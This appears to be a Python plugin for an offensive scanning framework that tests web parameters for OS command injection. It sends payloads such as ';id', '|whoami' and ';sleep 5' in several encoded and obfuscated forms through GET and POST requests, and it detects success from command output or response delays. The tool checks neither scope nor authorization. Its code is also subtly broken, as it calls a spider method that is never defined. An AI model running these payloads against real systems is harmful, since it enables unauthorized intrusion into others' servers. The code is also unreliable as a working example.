import requests
import time
import urllib.parse
import copy
import re

NAME = "cmdinj"
CATEGORY = "vuln"
DESCRIPTION = "Advanced Command Injection Scanner (Risk-aware + Mutation Engine + POST-first Strategy)"

# =================================================
# Payload Engine
# =================================================

BASE_PAYLOADS = [
    (";id", "Linux", "output"),
    ("&&id", "Linux", "output"),
    ("|id", "Linux", "output"),
    (";whoami", "Linux", "output"),
    ("&whoami", "Windows", "output"),
    ("|whoami", "Windows", "output"),
    (";sleep 5", "Linux", "time"),
    ("&&sleep 5", "Linux", "time"),
    ("|sleep 5", "Linux", "time"),
    ("&timeout /t 5", "Windows", "time"),
]

MUTATIONS = [
    lambda p: p,
    lambda p: urllib.parse.quote(p),
    lambda p: p.replace(" ", "${IFS}"),
    lambda p: f"`{p.strip(';')}`",
    lambda p: f"$({p.strip(';')})",
]


# =================================================
# Scanner Engine
# =================================================

class CmdInjectionEngine:

    def __init__(self, target, emit, options=None):
        self.target = target
        self.emit = emit
        self.options = options or {}
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Hellhound-CMDi/3.0"})
        self.vulnerabilities = []
        self.time_threshold = 4

    # -------------------------------------------------
    # Baseline Averaging
    # -------------------------------------------------

    def get_average_baseline(self, url, method="GET", data=None):
        times = []
        for _ in range(3):
            try:
                start = time.time()
                if method == "POST":
                    self.session.post(url, data=data or {}, timeout=10)
                else:
                    self.session.get(url, timeout=10)
                times.append(time.time() - start)
            except:
                continue
        return sum(times) / len(times) if times else 0

    # -------------------------------------------------
    # Mutation Engine
    # -------------------------------------------------

    def generate_payloads(self):
        mutated = []
        for payload, os_type, mode in BASE_PAYLOADS:
            for mutate in MUTATIONS:
                try:
                    mutated.append((mutate(payload), os_type, mode))
                except:
                    continue
        return mutated

    # -------------------------------------------------
    # Detection Logic
    # -------------------------------------------------

    def analyze_output(self, text):
        patterns = [
            r"uid=\d+\([^)]+\)",
            r"gid=\d+\([^)]+\)",
            r"groups=\d+",
            r"root:",
            r"www-data",
            r"administrator",
            r"<\s*DIR\s*>"
        ]

        for line in text.split("\n"):
            clean = re.sub(r"<.*?>", "", line).strip()
            for pattern in patterns:
                if re.search(pattern, clean, re.IGNORECASE):
                    return True, clean

        return False, None

    # -------------------------------------------------
    # GET Injection
    # -------------------------------------------------

    def inject_get_param(self, url, param_name):

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        baseline = self.get_average_baseline(url, "GET")

        for payload, os_type, mode in self.generate_payloads():

            new_query = copy.deepcopy(query)
            new_query[param_name] = [payload]

            encoded = urllib.parse.urlencode(new_query, doseq=True)
            injected_url = parsed._replace(query=encoded).geturl()

            try:
                start = time.time()
                r = self.session.get(injected_url, timeout=15)
                elapsed = time.time() - start

                if mode == "output":
                    vulnerable, proof = self.analyze_output(r.text)
                    if vulnerable:
                        self.store_vuln(injected_url, param_name, payload, os_type, "OUTPUT", proof)
                        return

                if mode == "time":
                    if elapsed > (baseline + self.time_threshold):
                        proof = f"Time delay {elapsed:.2f}s (baseline {baseline:.2f}s)"
                        self.store_vuln(injected_url, param_name, payload, os_type, "TIME", proof)
                        return

            except:
                continue

    # -------------------------------------------------
    # POST Injection
    # -------------------------------------------------

    def inject_post_param(self, url, param_name):

        baseline = self.get_average_baseline(url, "POST")

        for payload, os_type, mode in self.generate_payloads():

            data = {param_name: payload}

            try:
                start = time.time()
                r = self.session.post(url, data=data, timeout=15)
                elapsed = time.time() - start

                if mode == "output":
                    vulnerable, proof = self.analyze_output(r.text)
                    if vulnerable:
                        self.store_vuln(url, param_name, payload, os_type, "OUTPUT", proof)
                        return

                if mode == "time":
                    if elapsed > (baseline + self.time_threshold):
                        proof = f"Time delay {elapsed:.2f}s (baseline {baseline:.2f}s)"
                        self.store_vuln(url, param_name, payload, os_type, "TIME", proof)
                        return

            except:
                continue

    # -------------------------------------------------
    # Store (NO LIVE PRINTING)
    # -------------------------------------------------

    def store_vuln(self, url, param, payload, os_type, detection_type, proof):

        parsed = urllib.parse.urlparse(url)
        clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Deduplicate
        for existing in self.vulnerabilities:
            if existing["url"] == clean_url and existing["parameter"] == param:
                return

        vuln = {
            "type": "COMMAND_INJECTION",
            "url": clean_url,
            "parameter": param,
            "os": os_type,
            "detection": detection_type,
            "confidence": "High" if detection_type == "OUTPUT" else "Medium",
            "proof": proof
        }

        self.vulnerabilities.append(vuln)

    # -------------------------------------------------
    # Manual Mode
    # -------------------------------------------------

    def manual_scan(self):

        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            self.emit.warn("No URL parameters detected.")
            return

        for param in params:
            self.inject_post_param(self.target, param)
            self.inject_get_param(self.target, param)

    # -------------------------------------------------
    # Run
    # -------------------------------------------------

    def run(self):

        spider_data = self.options.get("spider_results")

        if spider_data:
            self.emit.info("Auto mode enabled (Spider integration)")
            self.auto_from_spider(spider_data)
        else:
            self.emit.info("Running manual parameter analysis")
            self.manual_scan()

        summary = {
            "total_vulnerabilities": len(self.vulnerabilities),
            "affected_parameters": list(
                set(v["parameter"] for v in self.vulnerabilities)
            )
        }

        return {
            "raw": f"Vulns found: {len(self.vulnerabilities)}",
            "intel": {
                "summary": summary,
                "vulnerabilities": self.vulnerabilities
            }
        }

# =================================================
# Framework Entry
# =================================================

def run(target, emit, options=None, stop_check=None, pause_check=None):

    emit.info(f"Command Injection Scan Started: {target}")

    engine = CmdInjectionEngine(target, emit, options)
    result = engine.run()

    emit.success("Command Injection Scan Complete")
    emit.success(result["raw"])

    return result
